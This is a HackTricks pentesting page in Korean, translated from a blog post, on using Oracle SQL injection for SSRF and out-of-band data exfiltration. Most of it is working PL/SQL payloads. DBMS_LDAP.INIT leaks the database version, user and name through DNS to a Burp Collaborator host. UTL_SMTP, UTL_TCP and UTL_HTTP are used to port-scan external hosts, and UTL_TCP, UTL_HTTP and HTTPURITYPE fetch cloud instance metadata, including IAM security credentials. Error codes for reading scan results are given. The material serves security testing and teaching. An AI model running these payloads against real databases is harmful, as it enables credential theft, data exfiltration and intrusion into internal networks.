# Oracle injection

{{#include ../../banners/hacktricks-training.md}}

**이 게시물에 대해 [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)의 삭제된 게시물의 Wayback Machine 복사본을 제공합니다.**

## SSRF

Oracle을 사용하여 Out of Band HTTP 및 DNS 요청을 수행하는 것은 잘 문서화되어 있지만, SQL 데이터 유출을 위한 주입 수단으로도 사용됩니다. 우리는 항상 이러한 기술/함수를 수정하여 다른 SSRF/XSPA를 수행할 수 있습니다.

Oracle 설치는 정말 고통스러울 수 있으며, 특히 명령을 시도하기 위해 빠른 인스턴스를 설정하려는 경우에는 더욱 그렇습니다. [Appsecco](https://appsecco.com)의 친구이자 동료인 [Abhisek Datta](https://github.com/abhisek)가 저에게 [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c)를 알려주었고, 이를 통해 t2.large AWS Ubuntu 머신과 Docker에서 인스턴스를 설정할 수 있었습니다.

저는 이 블로그 게시물의 과정에서 Oracle을 네이티브 설치로 전체 네트워크 액세스를 가진 것처럼 모방할 수 있도록 `--network="host"` 플래그와 함께 docker 명령을 실행했습니다.
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### URL 또는 호스트/포트 번호 사양을 지원하는 Oracle 패키지 <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

호스트 및 포트 사양을 지원하는 패키지와 기능을 찾기 위해 [Oracle Database Online Documentation](https://docs.oracle.com/database/121/index.html)에서 Google 검색을 실행했습니다. 구체적으로,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
검색 결과는 다음과 같습니다 (모두 외부 네트워크를 수행하는 데 사용할 수 있는 것은 아님)

- DBMS_NETWORK_ACL_ADMIN
- UTL_SMTP
- DBMS_XDB
- DBMS_SCHEDULER
- DBMS_XDB_CONFIG
- DBMS_AQ
- UTL_MAIL
- DBMS_AQELM
- DBMS_NETWORK_ACL_UTILITY
- DBMS_MGD_ID_UTL
- UTL_TCP
- DBMS_MGWADM
- DBMS_STREAMS_ADM
- UTL_HTTP

이 간단한 검색은 `DBMS_LDAP`와 같은 패키지를 명백히 건너뛰는데, 이는 호스트 이름과 포트 번호를 전달할 수 있게 해줍니다. [문서 페이지](https://docs.oracle.com/database/121/ARPLS/d_ldap.htm#ARPLS360)는 단순히 [다른 위치](https://docs.oracle.com/database/121/ARPLS/d_ldap.htm#ARPLS360)로 안내합니다. 따라서 제가 놓쳤을 수 있는 외부 요청을 수행할 수 있는 다른 Oracle 패키지가 있을 수 있습니다.

어쨌든, 우리가 발견하고 위에 나열한 패키지 중 일부를 살펴보겠습니다.

**DBMS_LDAP.INIT**

`DBMS_LDAP` 패키지는 LDAP 서버에서 데이터에 접근할 수 있게 해줍니다. `init()` 함수는 LDAP 서버와의 세션을 초기화하며, 호스트 이름과 포트 번호를 인수로 받습니다.

이 함수는 DNS를 통해 데이터 유출을 보여주는 문서화된 예가 있습니다, 아래와 같이.
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
그러나 이 함수가 호스트 이름과 포트 번호를 인수로 받아들이기 때문에, 이를 사용하여 포트 스캐너처럼 작동할 수 있습니다.

다음은 몇 가지 예입니다.
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
`ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.`는 포트가 닫혀 있는 반면 세션 값이 포트가 열려 있음을 나타냅니다.

**UTL_SMTP**

`UTL_SMTP` 패키지는 SMTP를 통해 이메일을 전송하기 위해 설계되었습니다. [Oracle 문서 사이트에 제공된 예제는 이 패키지를 사용하여 이메일을 전송하는 방법을 보여줍니다](https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478). 그러나 우리에게 흥미로운 점은 호스트 및 포트 사양을 제공할 수 있는 능력입니다.

아래에는 2초의 타임아웃을 가진 `UTL_SMTP.OPEN_CONNECTION` 함수의 간단한 예가 나와 있습니다.
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
`ORA-29276: transfer timeout`는 포트가 열려 있지만 SMTP 연결이 설정되지 않았음을 나타내고, `ORA-29278: SMTP transient error: 421 Service not available`는 포트가 닫혀 있음을 나타냅니다.

**UTL_TCP**

`UTL_TCP` 패키지와 그 절차 및 함수는 [서비스와의 TCP/IP 기반 통신을 허용합니다](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). 특정 서비스에 대해 프로그래밍된 경우, 이 패키지는 네트워크로의 접근 방법이 되거나 모든 TCP/IP 연결의 모든 측면을 제어할 수 있으므로 전체 서버 측 요청을 수행할 수 있습니다.

예제는 [Oracle 문서 사이트에서 이 패키지를 사용하여 웹 페이지를 가져오기 위해 원시 TCP 연결을 만드는 방법을 보여줍니다](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). 우리는 이를 조금 더 간단하게 만들어 메타데이터 인스턴스나 임의의 TCP/IP 서비스에 요청을 하는 데 사용할 수 있습니다.
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
흥미롭게도, 원시 TCP 요청을 작성할 수 있는 능력 덕분에 이 패키지는 모든 클라우드 제공자의 인스턴스 메타데이터 서비스에 쿼리하는 데에도 사용될 수 있습니다. 메서드 유형과 추가 헤더는 모두 TCP 요청 내에서 전달될 수 있습니다.

**UTL_HTTP 및 웹 요청**

아마도 모든 Out of Band Oracle SQL Injection 튜토리얼에서 가장 일반적이고 널리 문서화된 기술은 [`UTL_HTTP` 패키지](https://docs.oracle.com/database/121/ARPLS/u_http.htm#ARPLS070)입니다. 이 패키지는 문서에서 다음과 같이 정의됩니다 - `UTL_HTTP 패키지는 SQL 및 PL/SQL에서 하이퍼텍스트 전송 프로토콜(HTTP) 호출을 수행합니다. 이를 사용하여 HTTP를 통해 인터넷의 데이터에 접근할 수 있습니다.`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
이것을 사용하여 다음과 같은 쿼리로 기본적인 포트 스캐닝을 수행할 수도 있습니다.
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
`ORA-12541: TNS:no listener` 또는 `TNS:operation timed out`는 TCP 포트가 닫혀 있다는 신호이며, `ORA-29263: HTTP protocol error` 또는 데이터는 포트가 열려 있다는 신호입니다.

내가 과거에 사용했던 또 다른 패키지는 [`HTTPURITYPE` Oracle 추상 유형의 `GETCLOB()` 메서드](https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705)로, URL과 상호작용할 수 있으며 HTTP 프로토콜을 지원합니다. `GETCLOB()` 메서드는 URL에서 GET 응답을 [CLOB 데이터 유형으로 가져오는 데 사용됩니다.](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)[select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

{{#include ../../banners/hacktricks-training.md}}
